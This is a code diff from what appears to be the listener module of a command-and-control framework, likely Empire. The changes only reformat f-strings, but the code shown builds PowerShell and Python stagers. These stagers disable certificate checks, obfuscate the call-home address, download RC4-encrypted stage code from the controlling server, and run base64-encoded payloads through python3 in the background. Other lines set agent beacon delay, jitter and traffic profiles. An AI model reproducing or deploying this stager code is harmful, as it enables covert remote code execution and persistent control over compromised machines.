@@ -263,14 +263,12 @@ class Listener:
             if user_agent.lower() == "default":
                 profile = listenerOptions["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
-            stager += f"$u='{ user_agent }';"
+            stager += f"$u='{user_agent}';"
 
             if "https" in host:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
-            stager += (
-                f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
-            )
+            stager += f"$ser={helpers.obfuscate_call_home_address(host)};$t='{stage0}';"
 
             if user_agent.lower() != "none":
                 stager += "$wc.Headers.Add('User-Agent',$u);"
@@ -280,7 +278,7 @@ class Listener:
                         stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                     else:
                         # TODO: implement form for other proxy
-                        stager += f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');$wc.Proxy = $proxy;"
+                        stager += f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');$wc.Proxy = $proxy;"
 
                     if proxy_creds.lower() != "none":
                         if proxy_creds.lower() == "default":
@@ -293,11 +291,11 @@ class Listener:
                             if len(username.split("\\")) > 1:
                                 usr = username.split("\\")[1]
                                 domain = username.split("\\")[0]
-                                stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
+                                stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
 
                             else:
                                 usr = username.split("\\")[0]
-                                stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }');"
+                                stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}');"
 
                             stager += "$wc.Proxy.Credentials = $netcred;"
 
@@ -316,7 +314,7 @@ class Listener:
                     host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
             # code to turn the key string into a byte array
-            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"
 
             # this is the minimized RC4 stager code from rc4.ps1
             stager += listener_util.powershell_rc4()
@@ -346,7 +344,7 @@ class Listener:
                     )
 
             # add the RC4 packet to a cookie
-            stager += f'$wc.Headers.Add("Cookie","{ cookie }={ b64RoutingPacket.decode("UTF-8") }");'
+            stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket.decode("UTF-8")}");'
             stager += "$data=$wc.DownloadData($ser+$t);"
             stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
@@ -397,7 +395,7 @@ class Listener:
             launcherBase += dedent(
                 f"""
                 import urllib.request;
-                UA='{ user_agent }';server='{ host }';t='{ stage0 }';
+                UA='{user_agent}';server='{host}';t='{stage0}';
                 req=urllib.request.Request(server+t);
                 """
             )
@@ -419,32 +417,30 @@ class Listener:
                 for header in customHeaders:
                     headerKey = header.split(":")[0]
                     headerValue = header.split(":")[1]
-                    launcherBase += (
-                        f'req.add_header("{ headerKey }","{ headerValue }");\n'
-                    )
+                    launcherBase += f'req.add_header("{headerKey}","{headerValue}");\n'
 
             if proxy.lower() != "none":
                 if proxy.lower() == "default":
                     launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                 else:
                     proto = proxy.split(":")[0]
-                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{ proto }':'{ proxy }'}});\n"
+                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"
 
                 if proxy_creds != "none":
                     if proxy_creds == "default":
                         launcherBase += "o = urllib.request.build_opener(proxy);\n"
 
                         # add the RC4 packet to a cookie
-                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={ b64RoutingPacket }")];\n'
+                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={b64RoutingPacket}")];\n'
                     else:
                         username = proxy_creds.split(":")[0]
                         password = proxy_creds.split(":")[1]
                         launcherBase += dedent(
                             f"""
                             proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
-                            proxy_auth_handler.add_password(None,'{ proxy }','{ username }','{ password }');
+                            proxy_auth_handler.add_password(None,'{proxy}','{username}','{password}');
                             o = urllib.request.build_opener(proxy, proxy_auth_handler);
-                            o.addheaders=[('User-Agent',UA), ("Cookie", "session={ b64RoutingPacket }")];
+                            o.addheaders=[('User-Agent',UA), ("Cookie", "session={b64RoutingPacket}")];
                             """
                         )
 
@@ -471,7 +467,7 @@ class Listener:
                 )
                 if isinstance(launchEncoded, bytes):
                     launchEncoded = launchEncoded.decode("UTF-8")
-                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
+                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
             return launcherBase
 
         # very basic csharp implementation
@@ -571,7 +567,7 @@ class Listener:
                     remove += value
                 headers = ",".join(remove)
                 stager = stager.replace(
-                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
+                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                 )
 
             stagingKey = stagingKey.encode("UTF-8")
@@ -669,16 +665,16 @@ class Listener:
             code = helpers.strip_powershell_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("$AgentDelay = 60", f"$AgentDelay = { delay }")
-            code = code.replace("$AgentJitter = 0", f"$AgentJitter = { jitter}")
+            code = code.replace("$AgentDelay = 60", f"$AgentDelay = {delay}")
+            code = code.replace("$AgentJitter = 0", f"$AgentJitter = {jitter}")
             code = code.replace(
                 '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                f'$Profile = "{ profile }"',
+                f'$Profile = "{profile}"',
             )
-            code = code.replace("$LostLimit = 60", f"$LostLimit = { lostLimit }")
+            code = code.replace("$LostLimit = 60", f"$LostLimit = {lostLimit}")
             code = code.replace(
                 '$DefaultResponse = ""',
-                f'$DefaultResponse = "{ b64DefaultResponse.decode("UTF-8") }"',
+                f'$DefaultResponse = "{b64DefaultResponse.decode("UTF-8")}"',
             )
 
             if obfuscate:
@@ -700,15 +696,15 @@ class Listener:
             code = helpers.strip_python_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("delay=60", f"delay={ delay }")
-            code = code.replace("jitter=0.0", f"jitter={ jitter }")
+            code = code.replace("delay=60", f"delay={delay}")
+            code = code.replace("jitter=0.0", f"jitter={jitter}")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                f'profile = "{ profile }"',
+                f'profile = "{profile}"',
             )
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
-                f'defaultResponse = base64.b64decode("{ b64DefaultResponse.decode("UTF-8") }")',
+                f'defaultResponse = base64.b64decode("{b64DefaultResponse.decode("UTF-8")}")',
             )
 
             if obfuscate:
